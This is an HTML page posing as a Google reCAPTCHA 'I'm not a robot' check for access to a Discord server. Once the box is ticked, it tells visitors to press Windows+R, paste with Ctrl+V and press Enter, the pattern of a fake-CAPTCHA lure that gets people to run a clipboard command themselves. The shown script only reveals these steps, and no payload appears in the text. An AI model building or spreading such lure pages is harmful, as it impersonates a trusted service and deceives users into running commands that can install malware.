<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Verify to Access Discord</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .card {
      background: #fff;
      padding: 30px;
      border-radius: 12px;
      box-shadow: 0 10px 20px rgba(0,0,0,0.15);
      text-align: center;
    }

    .card h2 {
      margin-bottom: 20px;
    }

    .recaptcha-box {
      display: flex;
      align-items: center;
      border: 1px solid #d3d3d3;
      border-radius: 4px;
      padding: 15px;
      width: 300px;
      margin: 0 auto;
      background: #f9f9f9;
      position: relative;
    }

    .recaptcha-checkbox {
      width: 22px;
      height: 22px;
      border: 2px solid #c1c1c1;
      border-radius: 3px;
      margin-right: 15px;
      cursor: pointer;
      position: relative;
    }

    .recaptcha-checkbox.checked::after {
      content: "✓";
      color: #007bff;
      font-size: 16px;
      position: absolute;
      top: 0;
      left: 4px;
    }

    .recaptcha-label {
      flex-grow: 1;
      font-size: 14px;
      color: #222;
    }

    .recaptcha-logo {
      position: absolute;
      right: 10px;
      bottom: 5px;
      display: flex;
      flex-direction: column;
      align-items: center;
      font-size: 9px;
      color: #666;
    }

    .recaptcha-logo img {
      width: 24px;
      height: 24px;
    }

    .popup {
      display: none;
      margin-top: 25px;
      background: #ffffff;
      padding: 20px;
      border-radius: 10px;
      border: 1px solid #ccc;
      box-shadow: 0 0 10px rgba(0,0,0,0.1);
      text-align: left;
      width: 350px;
    }

    .popup h3 {
      margin-top: 0;
      color: #007bff;
    }

    .popup ol {
      padding-left: 20px;
    }

    .popup ol li {
      margin-bottom: 10px;
    }

    .popup .box {
      background: #eaffea;
      padding: 10px;
      margin-top: 15px;
      border-left: 4px solid #33cc33;
      font-family: monospace;
    }

    a {
      color: #666;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="card">
    <h2>Verify to access my Discord server</h2>

    <div class="recaptcha-box" onclick="toggleCheck()">
      <div class="recaptcha-checkbox" id="recaptchaCheckbox"></div>
      <div class="recaptcha-label">I'm not a robot</div>
      <div class="recaptcha-logo">
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
        <div><a href="#">Privacy</a> · <a href="#">Terms</a></div>
      </div>
    </div>

    <div class="popup" id="stepPopup">
      <h3>Complete these Verification Steps</h3>
      <ol>
        <li>Press & hold the Windows Key <strong>⊞</strong> + <strong>R</strong></li>
        <li>In the verification window, press <strong>Ctrl + V</strong></li>
        <li>Press <strong>Enter</strong> on your keyboard to finish.</li>
      </ol>
      <div class="box">✅ "I am not a robot - reCAPTCHA Verification ID: 8883"</div>
    </div>
  </div>

  <script>
    function toggleCheck() {
      const checkbox = document.getElementById("recaptchaCheckbox");
      const popup = document.getElementById("stepPopup");

      checkbox.classList.toggle("checked");
      if (checkbox.classList.contains("checked")) {
        popup.style.display = "block";
      } else {
        popup.style.display = "none";
      }
    }
  </script>
</body>
</html>
